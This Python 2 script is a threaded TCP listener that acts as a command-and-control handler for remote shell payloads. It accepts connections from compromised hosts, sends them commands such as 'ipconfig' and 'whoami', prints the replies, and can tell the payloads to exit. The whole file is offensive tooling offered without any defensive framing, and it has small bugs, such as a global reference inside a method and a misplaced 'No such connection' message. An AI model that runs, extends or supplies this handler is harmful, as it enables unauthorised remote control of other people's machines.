import socket
import threading
import time
lhost = ''
lport = 8080

class client(threading.Thread):
    def __init__(self, conn):
        super(client, self).__init__()
        self.conn = conn
        self.data = ''
    def run(self):
        while True:
            try:
                recv = self.conn.recv(1024)
                self.data = self.data + recv
            except Exception as e:
                print(e)
                break
    def send_msg(self, msg):
        self.conn.send(msg)
    def close(self):
        self.conn.shutdown(socket.SHUT_RDWR)
        self.conn.close()


class handler(threading.Thread):
    def __init__(self, lhost, lport):
        self.lhost = lhost
        super(handler, self).__init__()
        try:
            self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.s.bind((self.lhost, lport))
            self.s.listen(5)
        except socket.error:
            print 'Failed to create socket'
        self.clients = []
    def run(self):
        while True:
            conn, address = self.s.accept()
            if address[0] == '127.0.0.1':
                print('Socket closed')
                break
            c = client(conn)
            c.start()
            c.send_msg(u"\r\n")
            self.clients.append(c)
            print '[+] Client connected: {0}'.format(address[0])
    def stop_payload(self):
        for cl in self.clients:
            cl.send_msg('exit' + u"\n")
            cl.send_msg('exit' + u"\n")
    def stop_handler(self):
        try:
            for cl in self.clients:
                cl.close()
            # Connect to my local server to stop socket.accept()
            sclose = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if self.lhost == '':
                self.lhost = '127.0.0.1'
            sclose.connect((self.lhost, lport))
            sclose.close()
            self.s.close()
        except Exception as e:
            print(e)
    def send(self, msg, rhost=''):
        # Define rhost to choose the destination. Otherwise, message will be sent to all clients.
        t = 0
        while not len(get_conns.clients):
            time.sleep(1)
            if t > 10:
                break
            t += 1
        time.sleep(1)
        for c in self.clients:
            if not len(rhost):
                rhost = c.conn.getpeername()[0]
            if c.conn.getpeername()[0] == rhost:
                c.data = ''
                c.send_msg(msg + u"\r\n")
                while not len(c.data):
                    time.sleep(1)
                print(c.data)
                c.data = ''
                break
            print('[-] No such connection')





get_conns = handler(lhost, lport)
get_conns.start()
get_conns.send('ipconfig')
get_conns.send('whoami')
get_conns.stop_handler()
